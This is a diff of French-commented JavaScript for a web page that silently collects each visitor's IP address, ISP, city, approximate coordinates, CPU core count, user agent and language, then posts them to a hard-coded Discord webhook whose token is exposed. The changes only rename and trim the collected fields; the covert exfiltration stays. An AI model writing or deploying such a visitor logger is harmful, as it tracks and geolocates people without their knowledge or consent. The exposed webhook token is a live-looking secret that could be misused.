@@ -158,14 +158,14 @@
                 return {
                     isp: data.org || "FAI non disponible",
                     city: data.city || "Ville non disponible",
-                    address: data.loc ? `Coordonnées approx. : ${data.loc}` : "Adresse non disponible (IP-based)",
+                    coords: data.loc || "Coordonnées non disponibles",
                 };
             } catch (error) {
                 console.error("Erreur lors de la récupération des infos IP:", error);
                 return {
                     isp: "FAI non disponible",
                     city: "Ville non disponible",
-                    address: "Adresse non disponible",
+                    coords: "Coordonnées non disponibles",
                 };
             }
         }
@@ -178,11 +178,6 @@
             const language = navigator.language || "Langue non disponible";
             const screenSize = `${window.screen.width}x${window.screen.height}` || "Taille d'écran non disponible";
             const cpuCores = navigator.hardwareConcurrency || "Nombre de cœurs non disponible";
-            const cpuModel = userAgent.includes("Win64") || userAgent.includes("x86_64") ? "Architecture probable : x86_64" : "Architecture inconnue";
-            const motherboard = "Non détectable via JavaScript standard";
-            const pcName = window.location.hostname || "Nom du PC non disponible (limite navigateur)";
-            const port = "Non détectable via JavaScript (port source client inaccessible)";
-            const email = "Non disponible sans authentification explicite (ex. OAuth)";
 
             const webhookInfo = "https://discord.com/api/webhooks/1347906492048871485/4AJ9_2rpcD3X3M9TLgEAhBCD_Db_7j8E-rL_sDYqIpe4P3LOPMt4gRpskQJYBQI54_Jr";
 
@@ -192,19 +187,13 @@
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({ 
                         content: `**Nouvelle connexion au site**\n` +
-                                 `=== Identité ===\n` +
-                                 `**Nom du PC**: ${pcName}\n` +
-                                 `**Email lié au navigateur**: ${email}\n` +
                                  `=== Localisation ===\n` +
                                  `**IP**: ${userIP}\n` +
                                  `**Opérateur (FAI)**: ${ipInfo.isp}\n` +
                                  `**Ville**: ${ipInfo.city}\n` +
-                                 `**Adresse**: ${ipInfo.address}\n` +
-                                 `**Port réseau**: ${port}\n` +
+                                 `**Coordonnées**: ${ipInfo.coords}\n` +
                                  `=== Matériel ===\n` +
-                                 `**Modèle du processeur**: ${cpuModel}\n` +
                                  `**Nombre de cœurs CPU**: ${cpuCores}\n` +
-                                 `**Carte mère**: ${motherboard}\n` +
                                  `=== Navigateur ===\n` +
                                  `**User-Agent**: ${userAgent}\n` +
                                  `**Langue**: ${language}\n` +
